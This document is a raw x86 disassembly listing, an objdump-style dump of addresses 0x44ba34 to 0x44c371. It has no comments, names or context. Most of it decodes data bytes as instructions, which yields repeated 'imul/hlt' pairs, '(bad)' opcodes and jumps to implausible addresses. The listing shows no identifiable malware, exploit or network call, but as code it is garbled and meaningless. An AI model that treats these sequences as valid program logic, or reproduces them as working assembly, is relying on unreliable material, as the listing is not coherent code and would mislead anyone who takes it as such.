  44ba34:	pop    edx
  44ba35:	gs inc ebx
  44ba37:	add    cl,ch
  44ba39:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ba40:	jmp    0x44ba45
	...
  44ba59:	add    bh,dh
  44ba5b:	add    al,0x0
  44ba5d:	stos   BYTE PTR es:[edi],al
  44ba5e:	bound  eax,QWORD PTR [ebx+0x0]
  44ba61:	jmp    0xe944bf5d
  44ba66:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ba6d:	shl    DWORD PTR [edx-0x816ffbe],1
  44ba73:	add    al,0x0
  44ba75:	jmp    0xe944bf71
  44ba7a:	test   DWORD PTR [eax+eax*1],0x42a2d9
  44ba81:	jmp    0xe944bf7d
  44ba86:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ba8d:	and    DWORD PTR [ebx+0x42],esp
  44ba90:	add    cl,ch
  44ba92:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ba99:	jmp    0xbc44bf95
  44ba9e:	cmp    BYTE PTR [ebx+0x0],al
  44baa1:	add    BYTE PTR [ebp-0x72fffff9],bl
  44baa7:	pop    es
  44baa8:	add    BYTE PTR [eax],al
  44baaa:	lea    eax,[edi]
  44baac:	add    BYTE PTR [eax],al
  44baae:	loop   0x44ba79
  44bab0:	cmp    DWORD PTR [eax],eax
  44bab2:	pop    ebp
  44bab3:	pop    es
  44bab4:	add    BYTE PTR [eax],al
  44bab6:	dec    ebp
  44bab7:	pop    es
  44bab8:	add    BYTE PTR [eax],al
  44baba:	dec    ebp
  44babb:	pop    es
	...
  44bad4:	add    BYTE PTR [eax],al
  44bad6:	add    ah,ah
  44bad8:	leave  
  44bad9:	cmp    DWORD PTR [eax],eax
  44badb:	pop    ebp
  44badc:	pop    es
  44badd:	add    BYTE PTR [eax],al
  44badf:	dec    ebp
  44bae0:	pop    es
  44bae1:	add    BYTE PTR [eax],al
  44bae3:	dec    ebp
  44bae4:	pop    es
  44bae5:	add    BYTE PTR [eax],al
  44bae7:	jbe    0x44baae
  44bae9:	cmp    DWORD PTR [eax],eax
  44baeb:	sbb    eax,0xd000007
  44baf0:	pop    es
  44baf1:	add    BYTE PTR [eax],al
  44baf3:	or     eax,0x6e000007
  44baf8:	lds    edi,FWORD PTR [ecx]
  44bafa:	add    BYTE PTR ds:0xd000007,bl
  44bb00:	pop    es
  44bb01:	add    BYTE PTR [eax],al
  44bb03:	or     eax,0xfd000007
  44bb08:	dec    ebx
  44bb09:	cmp    al,BYTE PTR [eax]
  44bb0b:	fld    QWORD PTR [esi]
  44bb0d:	add    BYTE PTR [eax],al
  44bb0f:	int    0x6
  44bb11:	add    BYTE PTR [eax],al
  44bb13:	int    0x6
  44bb15:	add    BYTE PTR [eax],al
  44bb17:	in     eax,dx
  44bb18:	dec    ebx
  44bb19:	cmp    al,BYTE PTR [eax]
  44bb1b:	fld    QWORD PTR [esi]
  44bb1d:	add    BYTE PTR [eax],al
  44bb1f:	int    0x6
  44bb21:	add    BYTE PTR [eax],al
  44bb23:	int    0x6
  44bb25:	add    BYTE PTR [eax],al
  44bb27:	push   ebx
  44bb28:	dec    ebp
  44bb29:	cmp    al,BYTE PTR [eax]
  44bb2b:	popf   
  44bb2c:	push   es
  44bb2d:	add    BYTE PTR [eax],al
  44bb2f:	lea    eax,[esi]
  44bb31:	add    BYTE PTR [eax],al
  44bb33:	hlt    
  44bb34:	imul   edi,esp,0xffffffff
  44bb37:	hlt    
  44bb38:	aaa    
  44bb39:	enter  0x3d,0x0
	...
  44bb51:	add    BYTE PTR [eax],al
  44bb53:	add    ah,dh
  44bb55:	imul   edi,esp,0xffffffff
  44bb58:	hlt    
  44bb59:	imul   edi,esp,0xffffffff
  44bb5c:	hlt    
  44bb5d:	imul   edi,esp,0xffffffff
  44bb60:	hlt    
  44bb61:	push   ebp
  44bb62:	ret    0xf43d
  44bb65:	imul   edi,esp,0xffffffff
  44bb68:	hlt    
  44bb69:	imul   edi,esp,0xffffffff
  44bb6c:	hlt    
  44bb6d:	imul   edi,esp,0xffffffff
  44bb70:	hlt    
  44bb71:	mov    eax,edx
  44bb73:	cmp    eax,0xfffc6bf4
  44bb78:	hlt    
  44bb79:	imul   edi,esp,0xffffffff
  44bb7c:	hlt    
  44bb7d:	imul   edi,esp,0xffffffff
  44bb80:	hlt    
  44bb81:	leave  
  44bb82:	ret    0xf43d
  44bb85:	imul   edi,esp,0xffffffff
  44bb88:	hlt    
  44bb89:	imul   edi,esp,0xffffffff
  44bb8c:	hlt    
  44bb8d:	imul   edi,esp,0xffffffff
  44bb90:	hlt    
  44bb91:	ret    0x3dc1
  44bb94:	hlt    
  44bb95:	imul   edi,esp,0xffffffff
  44bb98:	hlt    
  44bb99:	imul   edi,esp,0xffffffff
  44bb9c:	hlt    
  44bb9d:	imul   edi,esp,0xffffffff
  44bba0:	hlt    
  44bba1:	jae    0x44bb66
  44bba3:	cmp    eax,0xfffc6bf4
  44bba8:	hlt    
  44bba9:	imul   edi,esp,0xffffffff
  44bbac:	hlt    
  44bbad:	imul   edi,esp,0xffffffff
  44bbb0:	hlt    
  44bbb1:	adc    ebx,eax
  44bbb3:	cmp    eax,0xfffc6bf4
	...
  44bbd0:	add    ah,dh
  44bbd2:	imul   edi,esp,0xffffffff
  44bbd5:	hlt    
  44bbd6:	imul   edi,esp,0xffffffff
  44bbd9:	hlt    
  44bbda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bbdb:	ret    0xf43d
  44bbde:	add    al,0xe7
  44bbe0:	add    esi,esp
  44bbe2:	add    al,0xe7
  44bbe4:	add    esi,esp
  44bbe6:	add    al,0xe7
  44bbe8:	add    esi,esp
  44bbea:	add    al,0xdc
  44bbec:	mov    bl,0xc9
  44bbee:	add    al,0xe7
  44bbf0:	add    esi,esp
  44bbf2:	add    al,0xe7
  44bbf4:	add    esi,esp
  44bbf6:	add    al,0xe7
  44bbf8:	add    esi,esp
  44bbfa:	add    al,0x55
  44bbfc:	mov    ah,0x29
  44bbfe:	add    eax,0x4f403e7
  44bc03:	out    0x3,eax
  44bc05:	hlt    
  44bc06:	add    al,0xe7
  44bc08:	add    esi,esp
  44bc0a:	add    al,0x2a
  44bc0c:	mov    ah,0x9
  44bc0e:	add    eax,0x4f403e7
  44bc13:	out    0x3,eax
  44bc15:	hlt    
  44bc16:	add    al,0xe7
  44bc18:	add    esi,esp
  44bc1a:	add    al,0xbb
  44bc1c:	mov    dl,0xe9
  44bc1e:	add    al,0xe7
  44bc20:	add    esi,esp
  44bc22:	add    al,0xe7
  44bc24:	add    esi,esp
  44bc26:	add    al,0xe7
  44bc28:	add    esi,esp
  44bc2a:	add    al,0x49
  44bc2c:	mov    bl,0xc9
  44bc2e:	add    al,0xe7
  44bc30:	add    esi,esp
  44bc32:	add    al,0xe7
  44bc34:	add    eax,DWORD PTR [eax]
	...
  44bc4e:	hlt    
  44bc4f:	add    al,0xe7
  44bc51:	add    esi,esp
  44bc53:	add    al,0xd3
  44bc55:	xor    ebp,DWORD PTR [edx]
  44bc57:	add    eax,0x4f403e7
  44bc5c:	out    0x3,eax
  44bc5e:	hlt    
  44bc5f:	add    al,0xe7
  44bc61:	add    esi,esp
  44bc63:	add    al,0x63
  44bc65:	xor    ecx,DWORD PTR [edx]
  44bc67:	add    eax,0x4f403e7
  44bc6c:	out    0x3,eax
  44bc6e:	hlt    
  44bc6f:	add    al,0x0
  44bc71:	jmp    0xa544c16d
  44bc76:	out    0x3e,eax
  44bc78:	add    cl,ch
  44bc7a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bc81:	jmp    0xee44c17d
  44bc86:	(bad)  
  44bc87:	ds add cl,ch
  44bc8a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bc91:	jmp    0x8f44c18d
  44bc96:	es aas 
  44bc98:	add    cl,ch
  44bc9a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bca1:	jmp    0x6c44c19d
  44bca6:	push   es
  44bca7:	aas    
  44bca8:	add    cl,ch
  44bcaa:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bcb1:	jmp    0x44bcb6
	...
  44bcca:	add    bh,dh
  44bccc:	add    al,0x0
  44bcce:	or     al,0xe6
  44bcd0:	ds add cl,ch
  44bcd3:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bcda:	jmp    0x5944c1d6
  44bcdf:	ret    0x3e
  44bce2:	jmp    0xe944c1de
  44bce7:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bcee:	push   0xffffffd3
  44bcf0:	inc    ecx
  44bcf1:	add    cl,ch
  44bcf3:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bcfa:	jmp    0x5444c1f6
  44bcff:	rol    DWORD PTR [ecx+0x0],cl
  44bd02:	add    ch,cl
  44bd04:	add    eax,DWORD PTR [eax]
  44bd06:	add    ch,cl
  44bd08:	add    eax,DWORD PTR [eax]
  44bd0a:	add    BYTE PTR [ebp+0x19000003],bl
  44bd10:	push   0x38d003a
  44bd15:	add    BYTE PTR [eax],al
  44bd17:	lea    eax,[ebx]
  44bd19:	add    BYTE PTR [eax],al
  44bd1b:	popf   
  44bd1c:	add    eax,DWORD PTR [eax]
  44bd1e:	add    ah,ah
  44bd20:	ins    BYTE PTR es:[edi],dx
  44bd21:	cmp    al,BYTE PTR [eax]
  44bd23:	lea    eax,[ebx]
  44bd25:	add    BYTE PTR [eax],al
  44bd27:	lea    eax,[ebx]
  44bd29:	add    BYTE PTR [eax],al
  44bd2b:	pop    ebp
  44bd2c:	add    eax,DWORD PTR [eax]
	...
  44bd46:	add    BYTE PTR [eax],al
  44bd48:	into   
  44bd49:	ins    BYTE PTR es:[edi],dx
  44bd4a:	cmp    al,BYTE PTR [eax]
  44bd4c:	dec    ebp
  44bd4d:	add    eax,DWORD PTR [eax]
  44bd4f:	add    BYTE PTR [ebp+0x3],cl
  44bd52:	add    BYTE PTR [eax],al
  44bd54:	pop    ebp
  44bd55:	add    eax,DWORD PTR [eax]
  44bd57:	add    dh,bh
  44bd59:	ins    BYTE PTR es:[edi],dx
  44bd5a:	cmp    al,BYTE PTR [eax]
  44bd5c:	dec    ebp
  44bd5d:	add    eax,DWORD PTR [eax]
  44bd5f:	add    BYTE PTR [ebp+0x3],cl
  44bd62:	add    BYTE PTR [eax],al
  44bd64:	sbb    eax,0x9f000003
  44bd69:	ins    DWORD PTR es:[edi],dx
  44bd6a:	cmp    al,BYTE PTR [eax]
  44bd6c:	or     eax,0xd000003
  44bd71:	add    eax,DWORD PTR [eax]
  44bd73:	add    BYTE PTR ds:0x77000003,bl
  44bd79:	ins    BYTE PTR es:[edi],dx
  44bd7a:	cmp    al,BYTE PTR [eax]
  44bd7c:	or     eax,0xd000003
  44bd81:	add    eax,DWORD PTR [eax]
  44bd83:	add    ch,bl
  44bd85:	add    al,BYTE PTR [eax]
  44bd87:	add    BYTE PTR [edi-0x32ffc593],cl
  44bd8d:	add    al,BYTE PTR [eax]
  44bd8f:	add    ch,cl
  44bd91:	add    al,BYTE PTR [eax]
  44bd93:	add    ah,dh
  44bd95:	imul   edi,esp,0xffffffff
  44bd98:	hlt    
  44bd99:	nop
  44bd9a:	out    0x3d,eax
  44bd9c:	hlt    
  44bd9d:	imul   edi,esp,0xffffffff
  44bda0:	hlt    
  44bda1:	imul   edi,esp,0xffffffff
  44bda4:	hlt    
  44bda5:	imul   edi,esp,0xffffffff
  44bda8:	hlt    
  44bda9:	in     eax,0x40
  44bdab:	add    BYTE PTR ds:[eax],al
	...
  44bdc2:	add    BYTE PTR [eax],al
  44bdc4:	add    ah,dh
  44bdc6:	imul   edi,esp,0xffffffff
  44bdc9:	hlt    
  44bdca:	imul   edi,esp,0xffffffff
  44bdcd:	hlt    
  44bdce:	imul   edi,esp,0xffffffff
  44bdd1:	hlt    
  44bdd2:	ds dec eax
  44bdd4:	ds hlt 
  44bdd6:	imul   edi,esp,0xffffffff
  44bdd9:	hlt    
  44bdda:	imul   edi,esp,0xffffffff
  44bddd:	hlt    
  44bdde:	imul   edi,esp,0xffffffff
  44bde1:	hlt    
  44bde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bde3:	dec    edi
  44bde4:	aas    
  44bde5:	hlt    
  44bde6:	imul   edi,esp,0xffffffff
  44bde9:	hlt    
  44bdea:	imul   edi,esp,0xffffffff
  44bded:	hlt    
  44bdee:	imul   edi,esp,0xffffffff
  44bdf1:	hlt    
  44bdf2:	fist   WORD PTR [edi-0x3940bc2]
  44bdf8:	push   esp
  44bdfa:	imul   edi,esp,0xffffffff
  44bdfd:	hlt    
  44bdfe:	imul   edi,esp,0xffffffff
  44be01:	hlt    
  44be02:	push   ds
  44be03:	cwde   
  44be04:	ds hlt 
  44be06:	imul   edi,esp,0xffffffff
  44be09:	hlt    
  44be0a:	imul   edi,esp,0xffffffff
  44be0d:	hlt    
  44be0e:	imul   edi,esp,0xffffffff
  44be11:	hlt    
  44be12:	outs   dx,BYTE PTR ds:[esi]
  44be13:	add    BYTE PTR [esi],bh
  44be15:	hlt    
  44be16:	imul   edi,esp,0xffffffff
  44be19:	hlt    
  44be1a:	imul   edi,esp,0xffffffff
  44be1d:	hlt    
  44be1e:	imul   edi,esp,0xffffffff
  44be21:	hlt    
  44be22:	dec    ecx
  44be23:	mov    bh,BYTE PTR [esi]
  44be25:	hlt    
  44be26:	add    al,0xe7
  44be28:	add    eax,DWORD PTR [eax]
	...
  44be42:	hlt    
  44be43:	add    al,0xe7
  44be45:	add    esi,esp
  44be47:	add    al,0xe7
  44be49:	add    esi,esp
  44be4b:	add    al,0x9f
  44be4d:	add    al,0x2
  44be4f:	add    eax,0x4f403e7
  44be54:	out    0x3,eax
  44be56:	hlt    
  44be57:	add    al,0x9b
  44be59:	jmp    0x4e1:0xea8e04e9
  44be60:	adc    ecx,DWORD PTR [esp+esi*1]
  44be63:	add    eax,0x53418e7
  44be68:	or     ecx,DWORD PTR [esp+esi*1]
  44be6b:	add    eax,0x5341a4f
  44be70:	pop    es
  44be71:	or     al,0x34
  44be73:	add    eax,0x4b40bdf
  44be78:	xlat   BYTE PTR ds:[ebx]
  44be79:	or     esi,DWORD PTR [esp+eax*1+0x4b40bdf]
  44be80:	out    0xb,eax
  44be82:	mov    ah,0x4
  44be84:	pop    ds
  44be85:	sbb    DWORD PTR [esp+eax*1+0x4b41917],esi
  44be8c:	call   FWORD PTR [eax]
  44be8e:	mov    ah,0x4
  44be90:	and    ebx,DWORD PTR [ecx]
  44be92:	mov    ah,0x4
  44be94:	pop    ss
  44be95:	sbb    DWORD PTR [esp+eax*1+0x4b4191f],esi
  44be9c:	daa    
  44be9d:	sbb    DWORD PTR [esp+eax*1+0x4b4189f],esi
  44bea4:	mov    ebx,DWORD PTR [eax]
	...
  44bebe:	add    BYTE PTR [esp+eax*1+0x4b41887],dh
  44bec5:	outs   dx,DWORD PTR ds:[esi]
  44bec6:	sbb    BYTE PTR [esp+eax*1+0x4b41873],dh
  44becd:	arpl   WORD PTR [eax],bx
  44becf:	xor    al,0x5
  44bed1:	add    BYTE PTR [ecx],dh
  44bed3:	or     eax,0xfd3cffc5
  44bed8:	(bad)  
  44bed9:	dec    DWORD PTR [edi*8-0x12c3003c]
  44bee0:	(bad)  
  44bee1:	(bad)  
  44bee2:	call   0xae44c3de
  44bee7:	daa    
  44bee8:	add    al,0x97
  44beea:	in     eax,0x75
  44beec:	cmp    al,0x0
  44beee:	jmp    0xe944c3ea
  44bef3:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44befa:	jmp    0xe944c3f6
  44beff:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bf06:	jmp    0xe944c402
  44bf0b:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bf12:	jmp    0xe944c40e
  44bf17:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44bf1e:	jmp    0xe944c41a
	...
  44bf3b:	add    BYTE PTR [edi+0x7c],al
  44bf3e:	clc    
  44bf3f:	in     eax,dx
  44bf40:	test   DWORD PTR [eax+eax*1],0x36982e71
  44bf47:	dec    ecx
  44bf48:	ds mov al,0x36
  44bf4b:	xor    DWORD PTR [esi],edi
  44bf4d:	dec    eax
  44bf4e:	sbb    DWORD PTR ss:[esi],ebp
  44bf51:	pusha  
  44bf52:	shr    DWORD PTR ss:[ecx],1
  44bf55:	js     0x44bf8d
  44bf57:	jmp    0xfd44c413
  44bf5c:	test   DWORD PTR [eax+eax*1],0x3a1431f5
  44bf63:	add    BYTE PTR [ecx-0x7ac067b5],dl
  44bf69:	dec    ebx
  44bf6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bf6b:	aas    
  44bf6c:	fnsave [edi]
  44bf6e:	add    BYTE PTR [eax],al
  44bf70:	sbb    DWORD PTR [ecx],eax
  44bf72:	add    BYTE PTR [eax],al
  44bf74:	test   eax,0xa9302057
  44bf79:	push   edi
  44bf7a:	cmp    BYTE PTR [eax],dh
  44bf7c:	adc    DWORD PTR [ecx+0x50],edx
  44bf7f:	xor    cl,bh
  44bf81:	push   eax
  44bf82:	ins    BYTE PTR es:[edi],dx
  44bf83:	xor    cl,dh
  44bf85:	push   eax
  44bf86:	jl     0x44bfb8
  44bf88:	and    DWORD PTR [ecx-0x74],edx
  44bf8b:	xor    BYTE PTR [ecx+0x51],al
  44bf8e:	pushf  
  44bf8f:	xor    cl,ah
  44bf91:	push   eax
  44bf92:	lods   al,BYTE PTR ds:[esi]
  44bf93:	xor    BYTE PTR [ecx+0x50],dl
  44bf96:	mov    esp,0xcc50e130
  44bf9b:	xor    cl,al
  44bf9d:	push   eax
  44bf9e:	fdiv   QWORD PTR [eax]
	...
  44bfb8:	add    cl,al
  44bfba:	push   eax
  44bfbb:	in     al,dx
  44bfbc:	xor    BYTE PTR [ecx],dh
  44bfbe:	push   ecx
  44bfbf:	cld    
  44bfc0:	xor    BYTE PTR [ecx+0x50],ah
  44bfc3:	or     al,0x31
  44bfc5:	inc    ecx
  44bfc6:	push   eax
  44bfc7:	clc    
  44bfc8:	dec    DWORD PTR [ebp+0x27]
  44bfcb:	add    BYTE PTR [eax],al
  44bfcd:	in     eax,0x1
  44bfcf:	add    BYTE PTR [eax],al
  44bfd1:	pop    ecx
  44bfd2:	push   edi
  44bfd3:	add    al,0x30
  44bfd5:	dec    ecx
  44bfd6:	push   edi
  44bfd7:	adc    al,0x30
  44bfd9:	cmp    DWORD PTR [edi+0x24],edx
  44bfdc:	xor    BYTE PTR [ecx+0x57],bh
  44bfdf:	xor    al,0x30
  44bfe1:	pop    ecx
  44bfe2:	push   edi
  44bfe3:	inc    esp
  44bfe4:	xor    BYTE PTR [ecx+0x79305457],cl
  44bfea:	push   edi
  44bfeb:	xor    BYTE PTR fs:[ecx-0x66cf8bb0],bh
  44bff2:	push   edi
  44bff3:	test   BYTE PTR [eax],dh
  44bff5:	hlt    
  44bff6:	stc    
  44bff7:	int3   
  44bff8:	fwait
  44bff9:	les    eax,FWORD PTR [ecx-0x63b5434]
  44bfff:	int3   
  44c000:	mov    ebx,0xcbcca024
  44c005:	and    al,0x98
  44c007:	int3   
  44c008:	(bad)  [eax+eax*2]
  44c00b:	int3   
  44c00c:	jmp    0x44c032
  44c00e:	cwde   
  44c00f:	int3   
  44c010:	sti    
  44c011:	add    al,0x60
  44c013:	ror    DWORD PTR [ebx],cl
  44c015:	add    eax,0x51bd378
  44c01a:	inc    eax
  44c01b:	shr    DWORD PTR [ebx],cl
	...
  44c035:	add    BYTE PTR ds:0xe53bd3b8,al
  44c03b:	pop    ds
  44c03c:	ror    DWORD PTR [ebx-0x1b],cl
  44c03f:	pop    ss
  44c040:	rcr    DWORD PTR [ebx-0x1b],cl
  44c043:	call   edx
  44c045:	imul   esp,ebp,0x57
  44c048:	sar    DWORD PTR [ebx-0x3b],cl
  44c04b:	(bad)  
  44c04d:	mov    eax,ebp
  44c04f:	not    ebx
  44c051:	fwait
  44c052:	lds    edi,FWORD PTR [edi-0x2d]
  44c055:	stos   DWORD PTR es:[edi],eax
  44c056:	(bad)
  44c059:	mov    ebx,0xcbd42025
  44c05e:	and    eax,0x25dbd418
  44c063:	rcl    bl,0xeb
  44c066:	and    eax,0x5fbd418
  44c06b:	pusha  
  44c06c:	into   
  44c06d:	or     eax,DWORD PTR [esi]
  44c06f:	js     0x44c03f
  44c071:	sbb    eax,DWORD PTR [esi]
  44c073:	inc    eax
  44c074:	into   
  44c075:	sub    eax,DWORD PTR [esi]
  44c077:	mov    eax,0x9fe63bce
  44c07c:	into   
  44c07d:	dec    ebx
  44c07e:	out    0x97,al
  44c080:	into   
  44c081:	pop    ebx
  44c082:	out    0x7f,al
  44c084:	into   
  44c085:	imul   esp,esi,0x4
  44c088:	pop    ebx
  44c089:	ror    BYTE PTR [edi+0x7fd26336],cl
  44c08f:	aaa    
  44c090:	jnp    0x44c064
  44c092:	pop    edi
  44c093:	aaa    
  44c094:	adc    edx,0x4f
  44c097:	aaa    
  44c098:	jnp    0x44c06c
	...
  44c0b2:	add    BYTE PTR [edi-0x402d5cca],ch
  44c0b8:	ss fwait
  44c0ba:	sar    BYTE PTR [edi-0x302d3cca],cl
  44c0c0:	ss fwait
  44c0c2:	ror    bh,cl
  44c0c4:	ss jecxz 0x44c097
  44c0c7:	push   DWORD PTR ds:0x35dfd0fb
  44c0cd:	ret    
  44c0ce:	ror    BYTE PTR [edi],1
  44c0d0:	ss mov ebx,0x2335efd0
  44c0d6:	sar    DWORD PTR [edi],1
  44c0d8:	ss sbb edx,ecx
  44c0db:	aas    
  44c0dc:	ss add edx,ecx
  44c0df:	(bad)  
  44c0e1:	fcmovnbe st,st(0)
  44c0e3:	(bad)  
  44c0e5:	arpl   cx,dx
  44c0e7:	jg     0x44c11e
  44c0e9:	jnp    0x44c0bc
  44c0eb:	pop    edi
  44c0ec:	xor    eax,0x354fd183
  44c0f1:	jnp    0x44c0c4
  44c0f3:	scas   eax,DWORD PTR es:[edi]
  44c0f4:	xor    eax,0x353fd123
  44c0f9:	sbb    edx,ecx
  44c0fb:	aas    
  44c0fc:	xor    eax,0x354fd143
  44c101:	sbb    edx,ecx
  44c103:	dec    edi
  44c104:	xor    eax,0x30ffd7e3
  44c109:	sti    
  44c10a:	xlat   BYTE PTR ds:[ebx]
  44c10b:	fbstp  TBYTE PTR [eax]
  44c10d:	ret    
  44c10e:	xlat   BYTE PTR ds:[ebx]
  44c10f:	rdtsc  
  44c111:	mov    ebx,0xa330efd7
  44c116:	xlat   BYTE PTR ds:[ebx]
	...
  44c12f:	add    BYTE PTR [edi+0x4b9d0030],bh
  44c135:	fnsave [ebx]
  44c137:	test   DWORD PTR [ebx-0x13],eax
  44c13a:	xor    ebx,DWORD PTR [ebp+0x2c]
  44c13d:	std    
  44c13e:	xor    esp,DWORD PTR [ebp+0x23]
  44c141:	lea    esi,[ebx]
  44c143:	jge    0x44c170
  44c145:	popf   
  44c146:	xor    eax,DWORD PTR [ebp+0x7d33ad23]
  44c14c:	retf   
  44c14d:	mov    esp,0x4cc3a533
  44c152:	xor    ebx,DWORD PTR [ebp-0x3acca335]
  44c158:	ret    
  44c159:	ins    BYTE PTR es:[edi],dx
  44c15a:	xor    ebx,DWORD PTR [ebp-0x1acc8355]
  44c160:	mov    ds:0xaafd330c,al
  44c165:	sbb    al,0x33
  44c167:	lds    esp,FWORD PTR [edx-0x3542ccd4]
  44c16d:	cmp    al,0x33
  44c16f:	and    eax,0x1d32ccc3
  44c174:	retf   
  44c175:	fdiv   QWORD PTR [edx]
  44c177:	add    eax,0xdd32ecc3
  44c17c:	stos   BYTE PTR es:[edi],al
  44c17d:	cld    
  44c17e:	xor    ah,BYTE PTR [ebp-0x5e]
  44c181:	mov    WORD PTR [edx],?
  44c183:	jge    0x44c12f
  44c185:	pushf  
  44c186:	xor    al,BYTE PTR [ebp+0x7d32aca2]
  44c18c:	dec    edx
  44c18d:	mov    esp,0x4c422532
  44c192:	xor    bl,BYTE PTR ds:0x0
	...
  44c1ac:	add    BYTE PTR [edx+0x5c],cl
  44c1af:	xor    al,BYTE PTR [ebp+0x42]
  44c1b2:	ins    BYTE PTR es:[edi],dx
  44c1b3:	xor    bl,BYTE PTR ds:0xe9327c2a
  44c1b9:	out    0x4,eax
  44c1bb:	add    BYTE PTR [ecx+0x490004f7],al
  44c1c1:	and    al,0xa4
  44c1c3:	sub    al,0x0
  44c1c5:	lds    edx,FWORD PTR [esp+eiz*4+0x33]
  44c1c9:	in     eax,dx
  44c1ca:	push   esp
  44c1cb:	lods   al,BYTE PTR ds:[esi]
  44c1cc:	xor    esp,ebp
  44c1ce:	push   esp
  44c1cf:	mov    ah,0x33
  44c1d1:	int    0x54
  44c1d3:	mov    esp,0xc4504533
  44c1d8:	xor    ebp,ecx
  44c1da:	push   esp
  44c1db:	cmp    BYTE PTR [ecx+edx*8],dh
  44c1de:	push   esp
  44c1df:	les    esi,FWORD PTR ds:0x35cc563d
  44c1e5:	in     eax,dx
  44c1e6:	push   ebp
  44c1e7:	sub    al,0x36
  44c1e9:	cmc    
  44c1ea:	push   edx
  44c1eb:	xor    al,0x36
  44c1ed:	ins    DWORD PTR es:[edi],dx
  44c1ee:	push   edx
  44c1ef:	pushf  
  44c1f0:	ss jne 0x44c245
  44c1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c1f4:	ss sub eax,0x5536ac53
  44c1fa:	push   ebx
  44c1fb:	mov    ah,0x36
  44c1fd:	lea    edx,[edx-0x44]
  44c200:	add    DWORD PTR ss:[eax+edx*2+0x37],edx
  44c205:	sbb    DWORD PTR [ecx-0x68],ecx
  44c208:	cmp    BYTE PTR [ecx],dh
  44c20a:	dec    ecx
  44c20b:	clc    
  44c20c:	cmp    BYTE PTR [ecx+0x390048],dl
	...
  44c22a:	mov    ecx,0x91390848
  44c22f:	dec    eax
  44c230:	adc    BYTE PTR [ecx],bh
  44c232:	mov    DWORD PTR [eax+0x18],ecx
  44c235:	cmp    ecx,esi
  44c237:	dec    ecx
  44c238:	and    BYTE PTR [ecx],bh
  44c23a:	lea    eax,[ebx+0xd5fff8]
  44c240:	add    BYTE PTR [eax],al
  44c242:	test   DWORD PTR [esi-0x5c],eax
  44c245:	cmp    bl,ch
  44c247:	inc    esi
  44c248:	lods   al,BYTE PTR ds:[esi]
  44c249:	cmp    ah,ch
  44c24b:	inc    esi
  44c24c:	mov    ah,0x3a
  44c24e:	sbb    eax,0x53abc47
  44c253:	inc    edi
  44c254:	les    edi,FWORD PTR [edx]
  44c256:	hlt    
  44c257:	cmp    eax,0x35fed3ca
  44c25c:	retf   0xeedb
  44c25f:	or     eax,0x15eee3ca
  44c264:	retf   0xdeeb
  44c267:	jge    0x44c233
  44c269:	repz fidiv WORD PTR [ebp-0x36]
  44c26d:	sti    
  44c26e:	into   
  44c26f:	jno    0x44c23a
  44c271:	bswap  edi
  44c273:	jno    0x44c23e
  44c275:	pop    ss
  44c276:	mov    edi,0xbf1fc971
  44c27b:	add    ecx,ecx
  44c27d:	daa    
  44c27e:	das    
  44c27f:	adc    cl,cl
  44c281:	das    
  44c282:	das    
  44c283:	jo     0x44c24e
  44c285:	aaa    
  44c286:	pop    ds
  44c287:	jo     0x44c252
  44c289:	aas    
  44c28a:	pop    ds
  44c28b:	and    cl,cl
  44c28d:	inc    edi
	...
  44c2a6:	add    BYTE PTR [edi],cl
  44c2a8:	enter  0xa7c9,0xf
  44c2ac:	enter  0xafc9,0xff
  44c2b0:	or     ecx,0x5f
  44c2b3:	clc    
  44c2b4:	inc    edi
  44c2b6:	addr16 lock bswap eax
  44c2ba:	jg     0x44c2a4
  44c2bc:	repz ror BYTE PTR [ebx-0x6c3f2420],0xd8
  44c2c4:	rol    eax,cl
  44c2c6:	fwait
  44c2c7:	rol    BYTE PTR [edi-0x78375840],1
  44c2cd:	shr    BYTE PTR [edi-0x483f6840],0xb8
  44c2d4:	xchg   eax,eax
  44c2d6:	mov    edi,0xc7c12830
  44c2db:	sub    BYTE PTR [eax],ch
  44c2dd:	ror    edi,0x20
  44c2e0:	rol    al,0x6b
  44c2e3:	sbb    DWORD PTR [edi+eax*8-0x68faed95],edi
  44c2ea:	leave  
  44c2eb:	dec    ebx
  44c2ec:	jbe    0x44c2d4
  44c2ee:	jae    0x44c333
  44c2f0:	jbe    0x44c29c
  44c2f2:	add    esi,esp
  44c2f4:	add    al,0xd3
  44c2f6:	sar    DWORD PTR [ecx-0x482abbcc],cl
  44c2fc:	xor    BYTE PTR [ecx+0x3530c1cf],ch
  44c302:	iret   
  44c303:	cmp    esi,DWORD PTR [ecx]
  44c305:	mov    edx,0xbf2f49d0
  44c30a:	rol    BYTE PTR [eax],cl
	...
  44c324:	imul   DWORD PTR ds:0x3888cc63
  44c32a:	xchg   esp,eax
  44c32b:	enter  0x3919,0xd2
  44c32f:	enter  0x380b,0x5
  44c333:	(bad)  
  44c334:	cmp    BYTE PTR cs:[esi],ah
  44c337:	mov    DWORD PTR [edi+0x38],0x3661c712
  44c33e:	fs leave 
  44c340:	jno    0x44c377
  44c342:	push   esi
  44c343:	leave  
  44c344:	mov    esi,DWORD PTR ds:0x35c4c9bb
  44c34a:	out    0x63,eax
  44c34c:	mov    ebx,0xf4047675
  44c351:	add    al,0xeb
  44c353:	sar    eax,cl
  44c355:	xor    al,0xcd
  44c357:	rcl    ebx,cl
  44c359:	xor    al,0x29
  44c35b:	aam    0x15
  44c35d:	xor    eax,0x3454d466
  44c362:	sub    edx,esp
  44c364:	xor    BYTE PTR [edx*8-0x26cddf2e],0xd4
  44c36c:	xor    DWORD PTR gs:[edx-0x2b],edi
  44c370:	push   edi
  44c371:	xor    DWORD PTR [ebp-0x30],esi
